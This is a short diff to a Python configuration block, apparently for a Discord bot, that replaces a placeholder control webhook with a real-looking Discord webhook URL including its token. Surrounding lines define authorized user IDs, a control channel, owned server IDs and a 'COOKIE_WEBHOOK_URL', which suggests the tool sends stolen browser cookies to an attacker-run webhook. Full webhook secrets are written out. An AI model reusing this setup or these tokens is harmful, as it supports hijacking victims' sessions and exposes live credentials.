@@ -26,7 +26,7 @@ logger = logging.getLogger(__name__)
 
 AUTHORIZED_USERS = [216953894322962433, 1422280514072608932, 219564668933373962]
 CONTROL_CHANNEL_ID = 1432729863692881972
-CONTROL_WEBHOOK_URL = "https://discord.com/api/webhooks/1432729863692881972/your_control_webhook_token_here"  # Replace with actual webhook URL
+CONTROL_WEBHOOK_URL = "https://discord.com/api/webhooks/1436112638613655575/UD47n5lXnYCA1-IyAZEjbxmuaQHp3uexXt5ncQLrGngDlw0PzbOwtNZPEbkjLMIb32-F"  # Replace with actual webhook URL
 COOKIE_WEBHOOK_URL = "https://discord.com/api/webhooks/1432710240343822467/uYzeK2Z0TADkceF97olVympDJiJIJFDYbVrnz4uHwpV3AYh7QswHwb8-EVvrQ1SzyCHb"
 OWNED_SERVER_IDS = [1396878002620727397]
 SERVER_INVITES = {}
